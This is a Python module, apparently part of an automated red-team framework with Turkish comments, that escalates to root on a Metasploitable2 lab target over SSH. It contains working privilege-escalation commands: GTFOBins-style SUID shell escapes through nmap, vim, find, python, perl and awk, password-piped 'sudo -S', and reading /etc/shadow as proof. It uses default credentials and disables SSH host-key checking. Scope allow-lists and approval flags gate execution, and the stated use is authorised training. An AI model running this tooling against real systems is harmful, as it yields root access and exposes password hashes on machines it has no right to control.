"""
AutoRedTeam - Local Privilege Escalation Engine (PrivEsc).

Bu modul, hedefe ilk erisim (foothold) saglandiktan sonra iceride root olmak
icin calisir. Yetki yukseltme (Privilege Escalation) tekniklerini uygular ve
root yetkisini (UID=0) somut kanitlarla dogrular.

DESTEKLENEN TEKNIKLER (Linux / Metasploitable2):
  - SUID Enumeration: Hedefte SUID bitli dosyalari listeler.
  - GTFOBins Analizi: SUID binary'ler arasinda yetki yukseltmeye izin veren
    araclari (nmap, vim, find, python, bash vb.) tespit eder.
  - Sudoers Denetimi: Parolasiz calisabilen sudo komutlarini (sudo -l) analiz
    eder.
  - Root Kaniti (Proof of Privilege): 'id', 'whoami' ve 'cat /etc/shadow'
    ciktilarini alarak yetkinin root (UID=0) oldugunu tesciller.

BAGLANTI MODELI:
  - Foothold genellikle SSH ile saglanir (msfadmin:msfadmin gibi). Bu motor,
    hedefte komut calistirmak icin SSH baglantisi kullanir (sshpass).
  - Alternatif olarak, zaten acik bir shell varsa (vsftpd/ingreslock backdoor),
    komutlar dogrudan socket uzerinden gonderilebilir.

GUVENLIK MIMARISI (Human-in-the-Loop / Otonom secilebilir):
  - Her privesc adimi bir "oneridir". Calistirilmasi icin insan onayi veya
    otonom mod gerekir.
  - Hedef, config/allowed_targets.txt icinde olmalidir.
  - Bu modul yalnizca YETKILI, izole egitim ortamlarinda kullanilmak uzere
    tasarlanmistir.
"""

import json
import logging
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List

# Ortak kapsam/docker yardimcilari (DRY - tek kaynak)
from core.scope import (
    ALLOWED_TARGETS_FILE,
    TARGET_SERVICE_MAP,
    is_target_allowed,
    log_audit as _log_audit,
    resolve_host as _resolve_host,
    run_command as _run_command,
)

logger = logging.getLogger(__name__)

# GTFOBins benzeri SUID binary -> privesc teknik eslemesi.
# Bu binary'ler SUID bitiyle root olarak calistiginda yetki yukseltmeye izin verir.
SUID_PRIVESC_BINARIES: Dict[str, Dict[str, str]] = {
    "nmap": {
        "technique": "nmap --interactive -> !sh",
        "command": "echo 'os.execute(\"/bin/sh\")' | nmap --interactive",
        "cwe": "CWE-732",
    },
    "vim": {
        "technique": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'",
        "command": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"id\")'",
        "cwe": "CWE-732",
    },
    "find": {
        "technique": "find . -exec /bin/sh -p \\; -quit",
        "command": "find / -exec /bin/sh -p -c id \\; -quit",
        "cwe": "CWE-732",
    },
    "bash": {
        "technique": "bash -p",
        "command": "bash -p -c id",
        "cwe": "CWE-732",
    },
    "sh": {
        "technique": "sh -p",
        "command": "sh -p -c id",
        "cwe": "CWE-732",
    },
    "python": {
        "technique": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "command": "python -c 'import os; os.setuid(0); os.system(\"id\")'",
        "cwe": "CWE-732",
    },
    "python3": {
        "technique": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "command": "python3 -c 'import os; os.setuid(0); os.system(\"id\")'",
        "cwe": "CWE-732",
    },
    "perl": {
        "technique": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\"'",
        "command": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); system(\"id\")'",
        "cwe": "CWE-732",
    },
    "env": {
        "technique": "env /bin/sh -p",
        "command": "env /bin/sh -p -c id",
        "cwe": "CWE-732",
    },
    "awk": {
        "technique": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "command": "awk 'BEGIN {system(\"id\")}'",
        "cwe": "CWE-732",
    },
}


def _build_result(
    technique: str,
    target: str,
    success: bool,
    output: str,
    approved: bool,
    evidence: str = "",
    note: str = "",
) -> Dict[str, Any]:
    """Yapilandirilmis privesc sonuc nesnesi uretir."""
    return {
        "status": "APPROVED" if approved else "AWAITING_APPROVAL",
        "tool": "privesc",
        "technique": technique,
        "target": target,
        "success": success,
        "output": output,
        "evidence": evidence,
        "note": note,
        "approved": approved,
        "timestamp": datetime.now().isoformat(),
    }


def _reject_out_of_scope(target: str, technique: str) -> Dict[str, Any]:
    """Kapsam disi hedefi loglar ve guvenli bir sonuc dondurur."""
    _log_audit({
        "event": "REJECTED_OUT_OF_SCOPE",
        "tool": "privesc",
        "technique": technique,
        "target": target,
        "timestamp": datetime.now().isoformat(),
    })
    return {
        "status": "REJECTED_OUT_OF_SCOPE",
        "tool": "privesc",
        "technique": technique,
        "target": target,
        "success": False,
        "message": (
            f"Target '{target}' is not in the allow-list "
            f"({ALLOWED_TARGETS_FILE}). Privesc blocked before execution."
        ),
    }


# ── SSH Komut Calistirma ────────────────────────────────────────────────────

def ssh_execute(
    target: str,
    username: str,
    password: str,
    command: str,
    port: int = 22,
    timeout: int = 30,
) -> str:
    """
    Hedefte SSH uzerinden komut calistirir (sshpass ile).
    Tools konteyneri icinde calistirilir; hedef servis adina erisir.
    """
    host = _resolve_host(target)
    cmd = (
        f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
        f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "
        f"-o HostKeyAlgorithms=+ssh-rsa "
        f"-p {port} {username}@{host} '{command}'"
    )
    return _run_command(cmd, timeout=timeout)


# ── Enumeration Teknikleri ──────────────────────────────────────────────────

def enum_suid_binaries(
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
) -> Dict[str, Any]:
    """
    Hedefte SUID bitli dosyalari listeler.
    Komut: find / -perm -u=s -type f 2>/dev/null
    """
    if not is_target_allowed(target):
        return _reject_out_of_scope(target, "suid_enumeration")

    note = (
        "SUID enumeration: Hedefte SUID bitli dosyalar listelenir. "
        "Bu dosyalar root yetkisiyle calistigi icin yetki yukseltme adayi olabilir."
    )
    if not approved:
        return _build_result(
            technique="suid_enumeration", target=target, success=False,
            output="", approved=False, note=note,
        )

    command = "find / -perm -u=s -type f 2>/dev/null"
    output = ssh_execute(target, username, password, command, port=port)
    output_lines = f"[*] SUID binaries on {target}:\n{output}"
    return _build_result(
        technique="suid_enumeration", target=target, success=True,
        output=output_lines, approved=True, evidence=output, note=note,
    )


def enum_sudoers(
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
) -> Dict[str, Any]:
    """
    Parolasiz calisabilen sudo komutlarini listeler.
    Komut: sudo -l
    """
    if not is_target_allowed(target):
        return _reject_out_of_scope(target, "sudoers_audit")

    note = (
        "Sudoers audit: Kullanicinin parolasiz (NOPASSWD) calistirabildigi "
        "sudo komutlari listelenir. Bu, yetki yukseltme icin kritik bir vektordur."
    )
    if not approved:
        return _build_result(
            technique="sudoers_audit", target=target, success=False,
            output="", approved=False, note=note,
        )

    command = "echo '' | sudo -S -l 2>/dev/null || sudo -l 2>/dev/null"
    output = ssh_execute(target, username, password, command, port=port)
    output_lines = f"[*] Sudo privileges for {username} on {target}:\n{output}"
    return _build_result(
        technique="sudoers_audit", target=target, success=True,
        output=output_lines, approved=True, evidence=output, note=note,
    )


def attempt_sudo_privesc(
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
) -> Dict[str, Any]:
    """
    Sudo yetkisiyle root olmayi dener (sudo -S).
    Kullanici sudo grubundaysa parolasiyla 'sudo -S id' calistirilarak
    uid=0(root) elde edilir ve dogrulanir.
    """
    if not is_target_allowed(target):
        return _reject_out_of_scope(target, "sudo_privesc")

    note = (
        "Sudo privesc: Kullanici sudo yetkisine sahipse parolasiyla "
        "'sudo -S' kullanilarak root (uid=0) olunmaya calisilir."
    )
    if not approved:
        return _build_result(
            technique="sudo_privesc", target=target, success=False,
            output="", approved=False, note=note,
        )

    # Parolayi sudo'ya pipe et ve root kimligini dogrula
    command = f"echo '{password}' | sudo -S id 2>/dev/null"
    output = ssh_execute(target, username, password, command, port=port)
    success = "uid=0" in output
    evidence = ""
    if success:
        m = re.search(r"uid=\d+\([^)]*\)", output)
        evidence = m.group(0) if m else output[:200]
    return _build_result(
        technique="sudo_privesc", target=target, success=success,
        output=f"[*] Sudo privesc attempt for {username}:\n{output}",
        approved=True, evidence=evidence, note=note,
    )


def verify_root(
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
) -> Dict[str, Any]:
    """
    Root yetkisini dogrular (Proof of Privilege).
    'id', 'whoami' ve 'cat /etc/shadow' ciktilarini alir.
    """
    if not is_target_allowed(target):
        return _reject_out_of_scope(target, "verify_root")

    note = (
        "Root kaniti (Proof of Privilege): 'id', 'whoami' ve /etc/shadow "
        "okunabilirligi ile root (UID=0) yetkisi tescillenir."
    )
    if not approved:
        return _build_result(
            technique="verify_root", target=target, success=False,
            output="", approved=False, note=note,
        )

    # Root dogrulamasi: once sudo ile root olarak dene (kullanici sudo yetkiliyse),
    # olmazsa dogrudan calistir. Boylece /etc/shadow okunabilirligi dogrulanir.
    command = (
        f"echo '{password}' | sudo -S id 2>/dev/null; "
        f"echo '{password}' | sudo -S whoami 2>/dev/null; "
        f"echo '{password}' | sudo -S head -1 /etc/shadow 2>/dev/null"
    )
    output = ssh_execute(target, username, password, command, port=port)
    # Sadece uid=0(root) kaniti gecerli sayilir; "root" kelimesi hata
    # mesajlarinda (/root/, root@host) gecebilecegi icin kullanilmaz.
    success = bool(re.search(r"uid=0\(root\)", output))
    evidence = ""
    if success:
        m = re.search(r"uid=\d+\([^)]*\)", output)
        evidence = m.group(0) if m else output[:200]
    return _build_result(
        technique="verify_root", target=target, success=success,
        output=f"[*] Root verification on {target}:\n{output}",
        approved=True, evidence=evidence, note=note,
    )


# ── GTFOBins Analizi ve Privesc Denemesi ────────────────────────────────────

def analyze_suid_output(suid_output: str) -> List[str]:
    """
    SUID enumeration ciktisini analiz eder ve GTFOBins tekniklerine uyan
    binary'leri dondurur.
    """
    found: List[str] = []
    for binary in SUID_PRIVESC_BINARIES:
        # SUID ciktisinda binary'nin tam yolu veya adi gecmeli
        pattern = rf"(?:^|/){re.escape(binary)}(?:\s|$)"
        if re.search(pattern, suid_output, re.MULTILINE):
            found.append(binary)
    return found


def attempt_gtfobins_privesc(
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
    suid_output: str = "",
) -> Dict[str, Any]:
    """
    SUID binary'ler arasinda GTFOBins teknikleriyle yetki yukseltmeyi dener.
    Basarili olursa root yetkisini 'id' ile dogrular.
    """
    if not is_target_allowed(target):
        return _reject_out_of_scope(target, "gtfobins_privesc")

    note = (
        "GTFOBins privesc: SUID bitli binary'ler (nmap, vim, find, python vb.) "
        "kullanilarak root yetkisi elde edilmeye calisilir."
    )
    if not approved:
        return _build_result(
            technique="gtfobins_privesc", target=target, success=False,
            output="", approved=False, note=note,
        )

    # SUID ciktisi verilmediyse once kendimiz topla
    if not suid_output:
        suid_output = ssh_execute(
            target, username, password,
            "find / -perm -u=s -type f 2>/dev/null", port=port,
        )

    candidates = analyze_suid_output(suid_output)
    if not candidates:
        return _build_result(
            technique="gtfobins_privesc", target=target, success=False,
            output="[-] No GTFOBins-eligible SUID binaries found.",
            approved=True, note=note,
        )

    output_lines: List[str] = []
    output_lines.append(f"[*] GTFOBins candidates found: {', '.join(candidates)}")

    for binary in candidates:
        entry = SUID_PRIVESC_BINARIES[binary]
        # Komutu hedefte calistir (root olarak SUID binary uzerinden)
        cmd = entry["command"]
        output_lines.append(f"[*] Trying {binary}: {entry['technique']}")
        out = ssh_execute(target, username, password, cmd, port=port)
        output_lines.append(f"    -> {out[:200]}")

        if re.search(r"uid=0\(root\)", out):
            output_lines.append(f"[+] SUCCESS: {binary} privesc to root!")
            output = "\n".join(output_lines)
            m = re.search(r"uid=\d+\([^)]*\)", out)
            evidence = m.group(0) if m else out[:200]
            return _build_result(
                technique=f"gtfobins_{binary}", target=target, success=True,
                output=output, approved=True, evidence=evidence, note=note,
            )

    output = "\n".join(output_lines)
    output_lines.append("[-] No GTFOBins technique succeeded.")
    return _build_result(
        technique="gtfobins_privesc", target=target, success=False,
        output=output, approved=True, note=note,
    )


# ── Privesc Registry ────────────────────────────────────────────────────────

PRIVESC_REGISTRY: Dict[str, Dict[str, Any]] = {
    "suid_enumeration": {
        "name": "suid_enumeration",
        "description": "SUID bitli dosyalari listele",
        "function": enum_suid_binaries,
    },
    "sudoers_audit": {
        "name": "sudoers_audit",
        "description": "Parolasiz sudo komutlarini listele",
        "function": enum_sudoers,
    },
    "sudo_privesc": {
        "name": "sudo_privesc",
        "description": "Sudo yetkisiyle root ol (sudo -S)",
        "function": attempt_sudo_privesc,
    },
    "gtfobins_privesc": {
        "name": "gtfobins_privesc",
        "description": "GTFOBins teknikleriyle yetki yukselt",
        "function": attempt_gtfobins_privesc,
    },
    "verify_root": {
        "name": "verify_root",
        "description": "Root yetkisini dogrula (Proof of Privilege)",
        "function": verify_root,
    },
}


def dispatch_privesc(
    technique: str,
    target: str,
    username: str,
    password: str,
    approved: bool = False,
    port: int = 22,
    **kwargs,
) -> Dict[str, Any]:
    """
    Privesc registry uzerinden ilgili teknik runner'ini cagirir.
    """
    entry = PRIVESC_REGISTRY.get(technique)
    if not entry:
        return {
            "status": "UNKNOWN_PRIVESC",
            "tool": "privesc",
            "technique": technique,
            "target": target,
            "success": False,
            "message": f"Unknown privesc technique '{technique}' requested. Blocked.",
        }
    # Yalnizca hedef fonksiyonun kabul ettigi kwargs'lari gecir.
    # (bazi teknikler 'command' alir, bazilari almaz)
    import inspect
    func = entry["function"]
    sig = inspect.signature(func)
    filtered_kwargs = {k: v for k, v in kwargs.items() if k in sig.parameters}
    return func(
        target=target, username=username, password=password,
        approved=approved, port=port, **filtered_kwargs,
    )
